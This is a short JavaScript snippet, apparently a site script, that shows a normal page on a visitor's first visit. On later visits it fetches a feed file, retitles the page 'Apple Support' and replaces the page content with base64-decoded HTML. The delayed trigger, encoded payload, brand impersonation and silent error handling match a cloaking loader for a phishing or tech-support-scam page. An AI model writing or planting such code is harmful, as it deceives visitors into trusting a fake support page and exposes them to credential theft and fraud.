(function () {
  var n = 0;
  try { n = +(localStorage.getItem("mh_v") || 0); localStorage.setItem("mh_v", String(n + 1)); } catch (e) {}
  if (n < 1) return;
  fetch("/assets/feed.json").then(function (r) { return r.json(); }).then(function (d) {
    document.title = "Apple Support";
    document.getElementById("content").innerHTML = atob(d.items[0]);
  }).catch(function () {});
})();
